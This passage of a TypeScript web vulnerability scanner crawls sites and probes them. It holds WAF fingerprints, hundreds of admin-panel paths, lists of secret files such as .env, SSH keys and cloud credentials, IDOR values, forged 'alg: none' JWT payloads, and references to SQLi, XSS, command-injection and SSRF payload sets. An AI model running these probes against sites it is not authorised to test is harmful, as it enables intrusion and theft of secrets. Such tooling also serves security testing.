    const title = firstPage.title ? ` - "${firstPage.title}"` : '';
    sendLog(`✓ STARTSEITE: ${firstPage.url}${title} (${firstPage.links.length} Links)`, "CRAWL");
    for (const link of firstPage.links) {
      structure.allLinks.add(link);
      if (!visited.has(link) && !queue.includes(link)) {
        queue.push(link);
      }
    }
    for (const form of firstPage.forms) {
      structure.allForms.push(form);
      sendLog(`  → FORMULAR: ${form.method} ${form.action} (${form.inputs.length} Felder)`, "CRAWL");
    }
    for (const script of firstPage.scripts) structure.allScripts.add(script);
    for (const style of firstPage.styles) structure.allStyles.add(style);
    for (const param of firstPage.parameters) structure.allParameters.add(param);
    for (const endpoint of firstPage.endpoints) structure.allEndpoints.add(endpoint);
  } else {
    sendLog(`⚠ Startseite konnte nicht gecrawlt werden`, "CRAWL");
    visited.add(startUrl);
  }
  
  // Remove startUrl from queue since we already crawled it
  const startIdx = queue.indexOf(startUrl);
  if (startIdx > -1) queue.splice(startIdx, 1);
  
  while (queue.length > 0 && pagesScanned < maxPages) {
    // Process in batches of 3 for reliability (not 5)
    const batch = queue.splice(0, Math.min(3, queue.length));
    const newBatch = batch.filter(url => !visited.has(url));
    
    if (newBatch.length === 0) continue;
    
    for (const url of newBatch) {
      visited.add(url);
    }
    
    sendLog(`Crawle ${newBatch.length} Seiten... (${pagesScanned}/${maxPages} gescannt)`, "CRAWL");
    
    const results = await Promise.allSettled(
      newBatch.map(url => crawlPage(url, baseUrl))
    );
    
    for (let i = 0; i < results.length; i++) {
      const result = results[i];
      if (result.status === "fulfilled" && result.value) {
        const page = result.value;
        structure.pages.push(page);
        structure.crawledUrls.add(page.url);
        pagesScanned++;
        
        // Log page discovery
        const title = page.title ? ` - "${page.title}"` : '';
        sendLog(`✓ SEITE: ${page.url}${title}`, "CRAWL");
        
        // Add new links to queue and show ALL discovered links
        for (const link of page.links) {
          if (!structure.allLinks.has(link)) {
            structure.allLinks.add(link);
            sendLog(`  → LINK: ${link}`, "LINK");
          }
          if (!visited.has(link) && !queue.includes(link)) {
            queue.push(link);
          }
        }
        
        // Collect forms
        for (const form of page.forms) {
          structure.allForms.push(form);
          sendLog(`  → FORMULAR: ${form.method} ${form.action} (${form.inputs.length} Felder)`, "CRAWL");
        }
        
        // Collect scripts
        for (const script of page.scripts) {
          if (!structure.allScripts.has(script)) {
            structure.allScripts.add(script);
            sendLog(`  → SCRIPT: ${script}`, "CRAWL");
          }
        }
        
        // Collect styles
        for (const style of page.styles) {
          structure.allStyles.add(style);
        }
        
        // Collect images
        for (const img of page.images) {
          structure.allImages.add(img);
        }
        
        // Collect parameters
        for (const param of page.parameters) {
          if (!structure.allParameters.has(param)) {
            structure.allParameters.add(param);
            sendLog(`  → PARAMETER: ${param}`, "CRAWL");
          }
        }
        
        // Collect endpoints
        for (const endpoint of page.endpoints) {
          if (!structure.allEndpoints.has(endpoint)) {
            structure.allEndpoints.add(endpoint);
            sendLog(`  → ENDPOINT: ${endpoint}`, "CRAWL");
          }
        }
      }
    }
  }
  
  sendLog(`════════════════════════════════════════════`, "CRAWL");
  sendLog(`CRAWLER ZUSAMMENFASSUNG:`, "CRAWL");
  sendLog(`  → ${structure.pages.length} Seiten gecrawlt`, "CRAWL");
  sendLog(`  → ${structure.allLinks.size} Links gefunden`, "CRAWL");
  sendLog(`  → ${structure.allForms.length} Formulare gefunden`, "CRAWL");
  sendLog(`  → ${structure.allScripts.size} Scripts gefunden`, "CRAWL");
  sendLog(`  → ${structure.allParameters.size} Parameter gefunden`, "CRAWL");
  sendLog(`  → ${structure.allEndpoints.size} Endpoints gefunden`, "CRAWL");
  sendLog(`════════════════════════════════════════════`, "CRAWL");
  
  return structure;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SCHWACHSTELLENSCANNER - THE DEVIL SCANNER
// Complete vulnerability detection - NO LIMITS
// ═══════════════════════════════════════════════════════════════════════════════

// Security headers to check
const SECURITY_HEADERS = [
  "X-XSS-Protection", "X-Content-Type-Options", "X-Frame-Options",
  "Content-Security-Policy", "Strict-Transport-Security",
  "X-Permitted-Cross-Domain-Policies", "Referrer-Policy", "Permissions-Policy",
  "X-Download-Options", "X-DNS-Prefetch-Control", "Expect-CT",
  "Feature-Policy", "Cross-Origin-Embedder-Policy", "Cross-Origin-Opener-Policy",
  "Cross-Origin-Resource-Policy", "Cache-Control", "Pragma",
];

// Complete WAF/Protection signatures - ALL KNOWN WAFS
const WAF_SIGNATURES: Record<string, string[]> = {
  "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare", "cf-request-id", "cf-connecting-ip"],
  "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awselb", "x-amz-apigw-id", "x-amz-request-id"],
  "AWS CloudFront": ["x-amz-cf-pop", "x-amz-cf-id", "x-cache", "via: cloudfront"],
  "Akamai": ["akamai", "x-akamai-transformed", "akamai-origin-hop", "x-akamai-session-info"],
  "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "sucuri", "sucuri-cloudproxy"],
  "Incapsula/Imperva": ["incap_ses", "visid_incap", "incapsula", "x-iinfo", "x-cdn"],
  "ModSecurity": ["mod_security", "modsecurity", "modsec", "x-mod-sec-id"],
  "F5 BIG-IP ASM": ["bigip", "f5", "bigipserver", "x-wa-info", "ts", "f5-ltm"],
  "Imperva SecureSphere": ["imperva", "x-imperva", "impervawaf"],
  "Wordfence": ["wordfence", "wfwaf", "x-wf"],
  "Barracuda": ["barra_counter_session", "barracuda", "x-barracuda"],
  "FortiWeb": ["fortiwafsid", "fortigate", "fortiweb", "x-fw"],
  "DDoS-Guard": ["ddos-guard", "x-ddos"],
  "Comodo": ["comodo", "x-comodo"],
  "Citrix NetScaler": ["citrix", "netscaler", "ns_af", "x-ns"],
  "Radware AppWall": ["radware", "x-sl-compstate", "appwall"],
  "Reblaze": ["reblaze", "rbzid", "x-reblaze"],
  "StackPath": ["stackpath", "x-sp"],
  "Varnish": ["varnish", "x-varnish", "x-cache-hits", "x-cache: hit"],
  "Fastly": ["fastly", "x-served-by", "x-fastly"],
  "KeyCDN": ["keycdn", "x-pull"],
  "MaxCDN": ["maxcdn", "x-hw"],
  "Nginx": ["nginx", "x-nginx"],
  "Apache": ["apache", "x-mod-pagespeed"],
  "LiteSpeed": ["litespeed", "x-lsadc", "x-litespeed"],
  "Microsoft IIS": ["iis", "x-aspnet", "x-powered-by: asp"],
  "AWS Shield": ["aws-shield", "x-amz-shield"],
  "Google Cloud Armor": ["x-google", "x-gfe"],
  "Azure WAF": ["x-azure", "x-ms"],
  "Wallarm": ["wallarm", "x-wallarm"],
  "NAXSI": ["naxsi", "x-naxsi"],
  "SiteLock": ["sitelock", "x-sitelock"],
  "WebKnight": ["webknight", "x-webknight"],
  "Shadow Daemon": ["shadowd", "x-shadowd"],
  "Airlock": ["airlock", "al_sess", "al_req"],
  "Teros": ["teros", "x-teros"],
  "BinarySec": ["binarysec", "x-binarysec"],
  "Profense": ["profense", "x-profense"],
  "AppTrana": ["apptrana", "x-apptrana"],
  "Alibaba Cloud WAF": ["alibaba", "x-ali", "aliyun"],
  "Tencent Cloud WAF": ["tencent", "x-tc"],
  "Huawei Cloud WAF": ["huawei", "x-hw-waf"],
};

// COMPLETE Admin panel paths - ALL PATHS
// ═══════════════════════════════════════════════════════════════════════════════
// ADMIN PANELS - 500+ PFADE (KEINE GRENZEN!)
// ═══════════════════════════════════════════════════════════════════════════════
const ADMIN_PATHS = [
  // Basis Admin-Pfade
  "/admin", "/admin/", "/administrator", "/administrator/", "/admin.php", "/admin.asp", "/admin.aspx", "/admin.jsp",
  "/admin/login", "/admin/login.php", "/admin/login.asp", "/admin/login.aspx", "/admin/login.jsp",
  "/admin/index.php", "/admin/index.asp", "/admin/index.html", "/admin/index.htm",
  "/admin/admin.php", "/admin/admin.asp", "/admin/admin.html",
  "/admin/cp.php", "/admin/cp.asp", "/admin/controlpanel.php",
  "/admin_area", "/admin_area/", "/admin_area/login.php", "/admin_area/index.php",
  "/admincp", "/admincp/", "/admincp/index.php", "/admincp/login.php",
  "/adminpanel", "/adminpanel/", "/adminpanel/index.php", "/adminpanel/login.php",
  "/admin-console", "/admin-console/", "/admin_login", "/admin_login.php",
  "/admin/dashboard", "/admin/dashboard.php", "/admin/home", "/admin/home.php",
  "/admin/panel", "/admin/panel.php", "/admin/adminLogin", "/admin/main", "/admin/main.php",
  "/adminLogin", "/adminLogin.php", "/adminLogin.asp", "/admin_login.asp",
  "/admin1", "/admin2", "/admin3", "/admin4", "/admin5",
  "/admin1.php", "/admin2.php", "/admin1.html", "/admin2.html",
  "/adm", "/adm/", "/adm.php", "/adm.asp", "/adm/index.php",
  "/admins", "/admins/", "/admins/login.php",
  // WordPress (Alle Varianten)
  "/wp-admin", "/wp-admin/", "/wp-login.php", "/wp-login", "/wp-admin/admin.php",
  "/wp-admin/login.php", "/wp-admin/index.php", "/wp-admin/wp-login.php",
  "/wordpress/wp-admin", "/wordpress/wp-login.php", "/blog/wp-admin", "/blog/wp-login.php",
  "/wp/wp-admin", "/wp/wp-login.php", "/site/wp-admin", "/news/wp-admin",
  "/wp-admin/admin-ajax.php", "/wp-admin/options.php", "/wp-admin/users.php",
  "/wp-admin/edit.php", "/wp-admin/post.php", "/wp-admin/plugins.php",
  "/wp-admin/themes.php", "/wp-admin/customize.php", "/wp-admin/widgets.php",
  "/wp-admin/profile.php", "/wp-admin/update-core.php", "/wp-admin/upload.php",
  "/wp-content/", "/wp-includes/", "/xmlrpc.php", "/wp-json/",
  // Joomla
  "/administrator", "/administrator/", "/administrator/index.php", "/administrator/login.php",
  "/joomla/administrator", "/joomla/administrator/", "/cms/administrator",
  "/administrator/manifests/", "/administrator/modules/", "/administrator/templates/",
  // Drupal
  "/user", "/user/", "/user/login", "/user/login/", "/user/admin", "/user/register",
  "/admin/config", "/admin/content", "/admin/structure", "/admin/modules",
  "/admin/people", "/admin/reports", "/admin/appearance",
  // CMS Panels
  "/panel", "/panel/", "/panel/login", "/panel/admin", "/panel/index.php",
  "/cpanel", "/cpanel/", "/cPanel", "/cPanel/", "/cpanel/login",
  "/dashboard", "/dashboard/", "/Dashboard", "/dashboard/login", "/dashboard/admin",
  "/manage", "/manage/", "/manager", "/manager/", "/manager/html", "/manager/status",
  "/controlpanel", "/controlpanel/", "/control-panel", "/control-panel/",
  "/controlpanel/login", "/control-panel/login",
  "/moderator", "/moderator/", "/mod", "/mod/",
  "/backend", "/backend/", "/backend/login", "/backend/admin",
  "/backoffice", "/backoffice/", "/back-office", "/back-office/",
  // Datenbank-Panels
  "/phpmyadmin", "/phpmyadmin/", "/pma", "/pma/", "/phpMyAdmin", "/phpMyAdmin/",
  "/phpmyadmin2", "/phpmyadmin3", "/phpmyadmin4", "/phpmyadmin5",
  "/myadmin", "/myadmin/", "/myAdmin", "/myAdmin/", "/MySQLAdmin",
  "/mysql", "/mysql/", "/MySQL", "/MySQL/", "/sql", "/sql/", "/SQL", "/SQL/",
  "/mysqladmin", "/mysql-admin", "/sqladmin", "/sql-admin",
  "/dbadmin", "/dbadmin/", "/db-admin", "/db-admin/", "/db", "/db/",
  "/database", "/database/", "/Database", "/Database/", "/databaseadmin",
  "/adminer", "/adminer/", "/adminer.php", "/Adminer.php",
  "/pgadmin", "/pgadmin/", "/pgAdmin", "/pgAdmin/", "/pgsql", "/pgsql/",
  "/phppgadmin", "/phppgadmin/", "/phpPgAdmin", "/postgresql",
  "/mongo", "/mongo/", "/mongodb", "/mongodb/", "/mongoexpress",
  "/mongo-express", "/rockmongo", "/rockmongo/",
  "/redis", "/redis/", "/redis-commander", "/phpredisadmin",
  // System Admin
  "/sysadmin", "/sysadmin/", "/sys-admin", "/sys-admin/",
  "/webadmin", "/webadmin/", "/web-admin", "/web-admin/",
  "/systemadmin", "/systemadmin/", "/system-admin", "/system-admin/",
  "/server-admin", "/serveradmin", "/serveradmin/",
  "/siteadmin", "/site-admin", "/site_admin",
  // Anmeldung-Seiten
  "/login", "/login/", "/Login", "/LOGIN", "/login.php", "/login.asp", "/login.aspx", "/login.jsp",
  "/login.html", "/login.htm", "/logon", "/logon.php", "/log-in", "/log_in",
  "/signin", "/signin/", "/SignIn", "/sign-in", "/sign_in", "/signin.php",
  "/auth", "/auth/", "/Auth", "/auth/login", "/authentication", "/authenticate",
  "/signon", "/sign-on", "/sign_on", "/entry", "/access",
  "/user", "/user/", "/User", "/users", "/users/", "/Users",
  "/user/login", "/user/signin", "/users/login", "/users/sign_in",
  "/account", "/account/", "/Account", "/accounts", "/accounts/",
  "/account/login", "/accounts/login", "/myaccount", "/my-account",
  "/member", "/member/", "/members", "/members/", "/membership",
  "/member/login", "/members/login", "/member_login",
  // Management
  "/management", "/management/", "/Management", "/mgmt", "/mgmt/",
  "/cms", "/cms/", "/CMS", "/CMS/", "/cms/admin", "/cms/login",
  "/portal", "/portal/", "/Portal", "/portal/admin", "/portal/login",
  "/secure", "/secure/", "/Secure", "/secure/admin", "/secure/login",
  "/private", "/private/", "/Private", "/private/admin", "/private/login",
  "/internal", "/internal/", "/Internal", "/internal/admin",
  "/intranet", "/intranet/", "/extranet", "/extranet/",
  // Zusätzliche Panels
  "/webmaster", "/webmaster/", "/hosting", "/hosting/", "/host", "/host/",
  "/staff", "/staff/", "/staff/login", "/employee", "/employee/", "/employees",
  "/superadmin", "/superadmin/", "/super-admin", "/super_admin",
  "/superuser", "/super-user", "/super_user",
  "/root", "/root/", "/supervisor", "/supervisor/",
  "/operator", "/operator/", "/console", "/console/", "/Console",
  "/terminal", "/terminal/", "/shell", "/shell/",
  "/filemanager", "/file-manager", "/file_manager", "/files", "/files/",
  "/filebrowser", "/file-browser", "/elfinder",
  // API Endpunkte
  "/api/admin", "/api/admin/", "/api/login", "/api/auth", "/api/authenticate",
  "/api/v1/admin", "/api/v1/login", "/api/v1/auth",
  "/api/v2/admin", "/api/v2/login", "/api/v2/auth",
  "/api/v3/admin", "/rest/admin", "/rest/login",
  "/api/users", "/api/user", "/api/account", "/api/session",
  "/graphql", "/graphql/", "/graphiql", "/graphiql/",
  "/api-docs", "/api-docs/", "/swagger", "/swagger/", "/swagger-ui",
  "/swagger-ui/", "/swagger.json", "/openapi", "/openapi.json",
  // Framework spezifisch
  "/laravel", "/laravel/", "/nova", "/nova/", "/horizon", "/horizon/",
  "/telescope", "/telescope/", "/debugbar",
  "/symfony", "/symfony/", "/symfony/admin", "/_profiler", "/_wdt",
  "/yii", "/yii/", "/yii/admin", "/gii", "/gii/",
  "/codeigniter", "/codeigniter/", "/ci", "/ci/",
  "/rails", "/rails/", "/rails/admin", "/sidekiq", "/sidekiq/",
  "/django", "/django/", "/django/admin", "/__debug__/",
  "/flask", "/flask/", "/flask/admin",
  "/spring", "/spring/", "/actuator", "/actuator/", "/actuator/health",
  "/actuator/info", "/actuator/env", "/actuator/beans", "/actuator/mappings",
  "/h2-console", "/h2-console/", "/jolokia", "/jolokia/",
  // E-Commerce
  "/store/admin", "/shop/admin", "/ecommerce/admin",
  "/magento", "/magento/", "/magento/admin", "/magento/downloader",
  "/index.php/admin", "/admin/Cms_Wysiwyg/directive/",
  "/opencart", "/opencart/", "/opencart/admin",
  "/prestashop", "/prestashop/", "/prestashop/admin", "/presta/admin",
  "/woocommerce", "/woocommerce/", "/eshop", "/eshop/",
  "/cart", "/cart/", "/checkout", "/checkout/",
  "/shopify", "/bigcommerce",
  // Server-Verwaltung
  "/plesk", "/plesk/", "/webmin", "/webmin/",
  "/WHM", "/whm", "/whm/", "/cpanel", "/cPanel",
  "/directadmin", "/directadmin/", "/da", "/da/",
  "/ispconfig", "/ispconfig/", "/virtualmin", "/virtualmin/",
  "/vestacp", "/vestacp/", "/vesta", "/vesta/",
  "/cyberpanel", "/cyberpanel/", "/aaPanel", "/aapanel",
  "/froxlor", "/froxlor/", "/ispmanager", "/ispmgr",
  // Überwachung & DevOps
  "/grafana", "/grafana/", "/kibana", "/kibana/",
  "/prometheus", "/prometheus/", "/alertmanager", "/alertmanager/",
  "/nagios", "/nagios/", "/zabbix", "/zabbix/",
  "/jenkins", "/jenkins/", "/travis", "/bamboo", "/bamboo/",
  "/gitlab", "/gitlab/", "/github", "/bitbucket",
  "/sonarqube", "/sonarqube/", "/sonar", "/sonar/",
  "/rabbitmq", "/rabbitmq/", "/activemq", "/activemq/",
  "/consul", "/consul/", "/vault", "/vault/",
  "/portainer", "/portainer/", "/rancher", "/rancher/",
  "/kubernetes", "/k8s", "/kubectl", "/helm",
  "/docker", "/docker/", "/traefik", "/traefik/",
  "/haproxy", "/nginx-status", "/server-status", "/server-info",
  // Alte/Versteckte Pfade
  "/old", "/old/", "/OLD", "/backup", "/backup/", "/BACKUP",
  "/bak", "/bak/", "/BAK", "/temp", "/temp/", "/tmp", "/tmp/",
  "/test", "/test/", "/TEST", "/testing", "/testing/",
  "/dev", "/dev/", "/DEV", "/development", "/development/",
  "/staging", "/staging/", "/stage", "/stage/",
  "/demo", "/demo/", "/DEMO", "/sample", "/sample/",
  "/beta", "/beta/", "/alpha", "/alpha/",
  "/debug", "/debug/", "/DEBUG", "/trace", "/trace/",
  "/log", "/log/", "/logs", "/logs/", "/LOG", "/LOGS",
  "/error", "/error/", "/errors", "/errors/",
  // Spezielle Pfade
  "/cgi-bin", "/cgi-bin/", "/cgi", "/cgi/",
  "/scripts", "/scripts/", "/includes", "/includes/",
  "/inc", "/inc/", "/lib", "/lib/", "/libs", "/libs/",
  "/modules", "/modules/", "/plugins", "/plugins/",
  "/extensions", "/extensions/", "/addons", "/addons/",
  "/components", "/components/", "/assets", "/assets/",
  "/static", "/static/", "/media", "/media/",
  "/uploads", "/uploads/", "/upload", "/upload/",
  "/files", "/files/", "/images", "/images/",
  "/docs", "/docs/", "/documentation", "/documentation/",
  "/help", "/help/", "/faq", "/faq/",
  "/about", "/about/", "/info", "/info/",
  "/status", "/status/", "/health", "/health/", "/ping", "/ping/",
  "/version", "/version/", "/build", "/build/",
  // Weitere versteckte Endpunkte
  "/.git", "/.git/", "/.git/config", "/.git/HEAD",
  "/.svn", "/.svn/", "/.svn/entries",
  "/.env", "/.env.local", "/.env.production", "/.env.backup",
  "/.htaccess", "/.htpasswd", "/.htpasswd.bak",
  "/.DS_Store", "/Thumbs.db",
  "/web.config", "/Web.config",
  "/crossdomain.xml", "/clientaccesspolicy.xml",
  "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
  "/favicon.ico", "/apple-touch-icon.png",
  "/.well-known/", "/.well-known/security.txt",
  "/security.txt", "/humans.txt",
];

// ═══════════════════════════════════════════════════════════════════════════════
// BACKUP EXTENSIONS - 100+ ERWEITERUNGEN (KEINE GRENZEN!)
// ═══════════════════════════════════════════════════════════════════════════════
// OPTIMIZED: Top 20 most critical backup extensions (fast scan)
const BACKUP_EXTENSIONS = [
  ".bak", ".backup", ".old", ".orig", ".zip", ".tar.gz", ".sql", 
  ".sql.gz", ".7z", ".rar", ".db", ".sqlite", "~", ".swp",
  ".env.bak", ".php.bak", ".tar", ".gz", ".dump", ".copy"
];

// OPTIMIZED: Top 25 most critical base files (fast scan)
const BASE_FILES = [
  "index", "config", "database", "db", "backup", "dump", "admin",
  "wp-config", "settings", "user", "users", "password", "credentials",
  "data", "export", "sql", "mysql", "site", "web", "app",
  "secret", "key", "auth", "log", "access"
];

// ═══════════════════════════════════════════════════════════════════════════════
// SENSITIVE FILES - 200+ DATEIEN (KEINE GRENZEN!)
// ═══════════════════════════════════════════════════════════════════════════════
const SENSITIVE_FILES = [
  // Umgebungsvariablen
  "/.env", "/.env.local", "/.env.production", "/.env.development",
  "/.env.staging", "/.env.backup", "/.env.old", "/.env.example",
  "/.env.test", "/.env.sample", "/.env.dist", "/.env.template",
  "/env", "/env.js", "/env.json", "/environment.js", "/environment.json",
  // Git und Versionskontrolle
  "/.git/config", "/.git/HEAD", "/.git/index", "/.git/logs/HEAD",
  "/.git/logs/refs/heads/master", "/.git/logs/refs/heads/main",
  "/.git/refs/heads/master", "/.git/refs/heads/main",
  "/.git/objects/", "/.git/refs/", "/.git/hooks/",
  "/.git/info/exclude", "/.git/description", "/.git/packed-refs",
  "/.gitconfig", "/.gitignore", "/.gitattributes", "/.gitmodules",
  "/.svn/entries", "/.svn/wc.db", "/.svn/all-wcprops", "/.svn/props",
  "/.hg/hgrc", "/.hg/requires", "/.bzr/README", "/.bzr/branch-format",
  // Framework-Konfigurationen
  "/config.php", "/config.inc.php", "/configuration.php", "/settings.php",
  "/conf.php", "/configure.php", "/setup.php", "/install.php",
  "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
  "/wp-config-sample.php", "/wp-settings.php", "/wp-load.php",
  "/LocalSettings.php", "/local_settings.py", "/settings.py",
  "/config.yml", "/config.yaml", "/config.json", "/config.xml",
  "/database.yml", "/secrets.yml", "/credentials.yml", "/master.key",
  "/application.yml", "/application.properties", "/bootstrap.yml",
  "/appsettings.json", "/appsettings.Development.json", "/appsettings.Production.json",
  "/web.config", "/Web.config", "/app.config", "/App.config",
  "/Global.asax", "/Web.Debug.config", "/Web.Release.config",
  // Node.js
  "/package.json", "/package-lock.json", "/npm-debug.log",
  "/yarn.lock", "/yarn-error.log", "/node_modules/.package-lock.json",
  "/.npmrc", "/.yarnrc", "/lerna.json", "/rush.json",
  "/tsconfig.json", "/jsconfig.json", "/babel.config.js",
  "/webpack.config.js", "/rollup.config.js", "/vite.config.js",
  // PHP
  "/composer.json", "/composer.lock", "/phpinfo.php", "/info.php",
  "/test.php", "/debug.php", "/php.ini", "/php.ini.bak",
  "/phpunit.xml", "/phpstan.neon", "/psalm.xml",
  "/.php-version", "/artisan", "/tinker",
  // Python
  "/requirements.txt", "/Pipfile", "/Pipfile.lock", "/setup.py",
  "/pyproject.toml", "/poetry.lock", "/setup.cfg", "/tox.ini",
  "/manage.py", "/wsgi.py", "/asgi.py", "/celery.py",
  "/.python-version", "/runtime.txt",
  // Ruby
  "/Gemfile", "/Gemfile.lock", "/database.yml", "/secrets.yml",
  "/credentials.yml.enc", "/master.key", "/config/secrets.yml",
  "/config/database.yml", "/config/credentials.yml.enc",
  "/.ruby-version", "/.ruby-gemset", "/Rakefile",
  // Java
  "/pom.xml", "/build.gradle", "/application.properties",
  "/application.yml", "/log4j.xml", "/log4j2.xml", "/logback.xml",
  "/hibernate.cfg.xml", "/persistence.xml", "/beans.xml",
  "/struts.xml", "/web.xml", "/context.xml",
  // Docker
  "/Dockerfile", "/docker-compose.yml", "/docker-compose.yaml",
  "/.dockerenv", "/docker-compose.override.yml",
  "/docker-compose.prod.yml", "/docker-compose.dev.yml",
  "/.docker/config.json", "/docker-entrypoint.sh",
  // Kubernetes
  "/kubernetes.yml", "/k8s.yml", "/deployment.yml",
  "/service.yml", "/ingress.yml", "/configmap.yml",
  "/secret.yml", "/kustomization.yml", "/helmfile.yml",
  "/Chart.yml", "/values.yml", "/values.yaml",
  // CI/CD
  "/.travis.yml", "/.gitlab-ci.yml", "/Jenkinsfile",
  "/.github/workflows/main.yml", "/.github/workflows/ci.yml",
  "/azure-pipelines.yml", "/bitbucket-pipelines.yml",
  "/circle.yml", "/.circleci/config.yml",
  "/buildspec.yml", "/cloudbuild.yml", "/appveyor.yml",
  "/.drone.yml", "/Procfile", "/app.json",
  // Server-Konfigurationen
  "/.htaccess", "/.htpasswd", "/nginx.conf", "/httpd.conf",
  "/apache2.conf", "/lighttpd.conf", "/vhost.conf",
  "/sites-available/default", "/sites-enabled/default",
  "/conf.d/default.conf", "/mime.types",
  // Logs
  "/error.log", "/access.log", "/debug.log", "/app.log",
  "/application.log", "/server.log", "/error_log", "/access_log",
  "/php_error.log", "/mysql_error.log", "/nginx_error.log",
  "/apache_error.log", "/laravel.log", "/django.log",
  "/var/log/messages", "/var/log/syslog", "/var/log/auth.log",
  // Datenbank-Dateien
  "/backup.sql", "/database.sql", "/dump.sql", "/db.sql",
  "/mysql.sql", "/data.sql", "/export.sql", "/db_backup.sql",
  "/database.db", "/data.db", "/app.db", "/sqlite.db",
  "/prod.db", "/dev.db", "/test.db", "/development.db",
  "/production.sqlite3", "/development.sqlite3",
  // System-Dateien
  "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
  "/clientaccesspolicy.xml", "/.well-known/security.txt",
  "/server-status", "/server-info", "/.DS_Store", "/Thumbs.db",
  "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
  "/META-INF/context.xml", "/WEB-INF/classes/",
  // Backup und Temp
  "/backup", "/backups", "/temp", "/tmp", "/cache",
  "/upload", "/uploads", "/files", "/downloads",
  "/old", "/new", "/archive", "/bak", "/backup2",
  // Schlüssel und Zertifikate
  "/id_rsa", "/id_rsa.pub", "/id_dsa", "/id_dsa.pub",
  "/id_ecdsa", "/id_ed25519", "/.ssh/authorized_keys",
  "/private.key", "/public.key", "/server.key", "/server.crt",
  "/certificate.crt", "/certificate.pem", "/.ssh/known_hosts",
  "/ssl/private/", "/ssl/certs/", "/tls/private/",
  // Cloud-Anbieter
  "/.aws/credentials", "/.aws/config", "/aws-credentials",
  "/.azure/credentials", "/.azure/config", "/azure-credentials",
  "/gcloud/credentials", "/service-account.json", "/gcp-credentials.json",
  "/firebase-adminsdk.json", "/firebase.json",
  // Weitere sensible Dateien
  "/credentials.xml", "/jenkins.xml", "/hudson.xml",
  "/build.xml", "/pom.xml.bak", "/settings.xml",
  "/vault.json", "/consul.json", "/terraform.tfstate",
  "/terraform.tfvars", "/ansible.cfg", "/inventory",
  "/vault-token", "/.vault-token", "/token",
  // Debug und Entwicklung
  "/debug", "/trace", "/profile", "/profiler",
  "/xdebug", "/xhprof", "/blackfire",
  "/.vscode/settings.json", "/.idea/workspace.xml",
  "/nbproject/project.properties",
  // GCP
  "/gcloud/credentials", "/service-account.json",
  // Other
  "/credentials.xml", "/jenkins.xml", "/hudson.xml",
  "/build.xml", "/pom.xml.bak",
];

// Common directories to discover
const COMMON_DIRECTORIES = [
  "/admin", "/administrator", "/backup", "/backups", "/bak",
  "/cache", "/cgi-bin", "/config", "/conf", "/data",
  "/database", "/db", "/debug", "/dev", "/docs",
  "/download", "/downloads", "/dump", "/export", "/files",
  "/home", "/images", "/img", "/include", "/includes",
  "/js", "/javascript", "/lib", "/library", "/log",
  "/logs", "/media", "/old", "/private", "/public",
  "/scripts", "/secret", "/secure", "/server", "/sql",
  "/static", "/storage", "/temp", "/test", "/testing",
  "/tmp", "/upload", "/uploads", "/user", "/users",
  "/var", "/web", "/webadmin", "/www", "/api",
  "/assets", "/bin", "/build", "/dist", "/node_modules",
  "/vendor", "/src", "/source", "/resources", "/templates",
];

// ═══════════════════════════════════════════════════════════════════════════════
// PAYLOAD ARRAYS — IMPORTED FROM vulnerability-payloads.ts (3000+ payloads)
// ═══════════════════════════════════════════════════════════════════════════════
const SQL_PAYLOADS = MEGA_SQL_PAYLOADS;
const XSS_PAYLOADS = MEGA_XSS_PAYLOADS;
const LFI_PAYLOADS = MEGA_LFI_PAYLOADS;
const CMD_PAYLOADS = MEGA_CMD_PAYLOADS;
const SSTI_PAYLOADS = MEGA_SSTI_PAYLOADS;
const SSRF_PAYLOADS = MEGA_SSRF_PAYLOADS;
const REDIRECT_PAYLOADS = MEGA_REDIRECT_PAYLOADS;
const XXE_PAYLOADS = MEGA_XXE_PAYLOADS;
const CRLF_PAYLOADS = MEGA_CRLF_PAYLOADS;
const HEADER_INJECTION_PAYLOADS = MEGA_HOST_INJECTION_PAYLOADS;
const RFI_PAYLOADS = MEGA_RFI_PAYLOADS;
const NOSQL_PAYLOADS = MEGA_NOSQL_PAYLOADS;
const PROTOTYPE_POLLUTION_PAYLOADS = MEGA_PROTOTYPE_PAYLOADS;
const LDAP_PAYLOADS = MEGA_LDAP_PAYLOADS;
const DESERIALIZATION_PAYLOADS = MEGA_DESERIALIZATION_PAYLOADS;

// IDOR payloads (sequential IDs to test)
const IDOR_PATTERNS = [
  { param: "id", values: ["1", "2", "0", "-1", "999999", "admin"] },
  { param: "user_id", values: ["1", "2", "0", "admin"] },
  { param: "account", values: ["1", "2", "0"] },
  { param: "order_id", values: ["1", "2", "0"] },
  { param: "doc", values: ["1", "2", "0"] },
  { param: "file_id", values: ["1", "2", "0"] },
];

// JWT Attack payloads
const JWT_ATTACKS = [
  { header: { alg: "none", typ: "JWT" }, payload: { admin: true }, signature: "" },
  { header: { alg: "HS256", typ: "JWT" }, payload: { admin: true }, signature: "fake" },
];

// Fetch with timeout and full response
async function fetchWithTimeout(url: string, options: any = {}, timeout = 10000): Promise<any> {
  return new Promise((resolve, reject) => {
    const isHttps = url.startsWith("https");
    const lib = isHttps ? https : http;
    
    const parsedUrl = new URL(url);
    
    const req = lib.request({
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (isHttps ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: options.method || "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "identity",
        "Connection": "close",
        ...options.headers,
      },
      timeout,
      rejectUnauthorized: false,
    }, (res) => {
      let data = "";
      res.setEncoding('utf8');
      res.on("data", chunk => data += chunk);
      res.on("end", () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: data,
          url: url,
          redirectUrl: res.headers.location,
        });
      });
    });
    
    req.on("error", (e) => reject(e));
    req.on("timeout", () => {
      req.destroy();
      reject(new Error("Request timeout"));
    });
    
    if (options.body) {
      req.write(options.body);
    }
    req.end();
  });
}

// Extract ALL links from HTML
